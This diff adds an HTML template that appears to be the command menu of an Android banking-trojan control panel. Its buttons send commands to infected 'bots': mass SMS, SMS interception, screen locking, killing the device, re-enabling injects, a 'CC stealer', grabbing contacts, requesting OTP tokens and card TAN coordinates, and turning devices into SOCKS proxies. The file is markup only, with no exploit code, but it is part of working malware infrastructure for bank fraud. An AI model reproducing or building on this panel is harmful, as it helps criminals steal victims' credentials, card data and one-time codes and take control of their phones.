@@ -1,0 +1,89 @@
+
+<div id="command_menu" style='width: 100%; position: fixed; bottom: 5px; display: none; z-index: 9998;'>
+<div style='margin: 0 auto; width: 85%;'>
+<nav class="navbar navbar-inverse navbar-embossed" role="navigation" style='margin-bottom: 0'>
+
+<ul class="nav navbar-nav navbar-center" id='command-list'> 
+
+	<div class="navbar-header">
+		<a class="navbar-brand" href="javascript:undefined"></a>
+	</div>
+
+	<li><a href="javascript:show_ajax_form('bot_ussd')">
+		<i class="fa fa-institution"></i><br />
+		USSD</a></li>
+
+	<li><a href="javascript:show_ajax_form('bot_send_sms')">
+		<span class="glyphicon glyphicon-send" aria-hidden="true"></span><br />
+		SMS</a></li>
+		
+	<li><a href="javascript:show_ajax_form('bot_mass_sms')">
+		<span class="glyphicon glyphicon-th" aria-hidden="true"></span><br />
+		Mass SMS</a></li>
+		
+	<li><a href="javascript:show_ajax_form('bot_mass_sms_plus')">
+		<span class="glyphicon glyphicon-screenshot" aria-hidden="true"></span><br />
+		Mass SMS+</a></li>
+		
+	<li><a href="javascript:msg_cmd_select('bot_screen_lock_on', 'bot_screen_lock_off')">
+		<span class="glyphicon glyphicon-lock" aria-hidden="true"></span><br />
+		Screen Locker</a></li>
+		
+	<li><a href="javascript:msg_cmd_select('bot_intercept_on', 'bot_intercept_off')">
+		<i class="fa fa-exchange" title="SMS Intercept"></i><br />
+		SMS Intercept</a></li>
+		
+	<li><a href="javascript:msg_cmd_select('bot_kill_on', 'bot_kill_off')">
+		<i class="fa fa-snowflake-o" title="Kill device"></i><br />
+		Kill</a></li>
+		
+	<li><a href="javascript:show_ajax_form('bot_notification')">
+		<span class="glyphicon glyphicon-bell" aria-hidden="true"></span><br />
+		Notification</a></li>
+		
+	<li><a href="javascript:show_ajax_form('panel_delete_bot')">
+		<span class="glyphicon glyphicon-trash" aria-hidden="true"></span><br />
+		Remove</a></li>
+</ul>
+<ul class="nav navbar-nav navbar-right" style='margin-right: 10px'>
+
+	<li class="dropup" >
+		<a href="" class="dropdown-toggle" data-toggle="dropdown"><span class="fui-triangle-up"></span><br />More</a>
+		<span class="dropdown-arrow"></span>
+		<ul class="dropdown-menu">
+			<li><a href="javascript:show_ajax_form('bot_update_info')">
+				<i class="fa fa-refresh marginRight10"></i> Update bot info</a></li>
+			<li class="divider" style="border-bottom: 1px dotted #eee;"></li>
+
+<!--
+			<li><a href="javascript:show_ajax_form('bot_sms_redirect')">
+				<i class="fa fa-envelope marginRight10"></i> SMS redirect</a></li>
+-->
+
+			<li><a href="javascript:show_ajax_form('bot_repeat_inject')">
+				<i class="fa fa-institution marginRight10"></i> Re-enable inject</a></li>
+
+			<li><a href="javascript:show_ajax_form('bot_fire_cc')">
+				<span class="glyphicon glyphicon-pushpin marginRight10" aria-hidden="true"></span> Show CC stealer</a></li>
+					
+			<li class="divider" style="border-bottom: 1px dotted #eee;"></li>
+			
+			<li %SHOW_MOD_CONTACTS%><a href="javascript:show_ajax_form('bot_get_contacts')">
+				<i class="fa fa-address-book marginRight10"></i> Get contacts</a></li>
+				
+			<li %SHOW_MOD_OTP_TOKENS%><a href="javascript:show_ajax_form('bot_request_token')">
+				<i class="fa fa-key marginRight10"></i> Request token</a></li>
+				
+			<li %SHOW_MOD_CARDTAN%><a href="javascript:show_ajax_form('bot_request_coordinates')">
+				<i class="fa fa-compass marginRight10"></i> Request coordinates</a></li>
+				
+			<li %SHOW_MOD_SOCKS%><a href="javascript:show_ajax_form('bot_socks')">
+				<span class="glyphicon glyphicon-globe marginRight10" aria-hidden="true"></span> Socks</a></li>
+		</ul>
+	</li>
+</ul>
+	
+</nav><!-- /navbar -->
+</div>
+	
+</div>
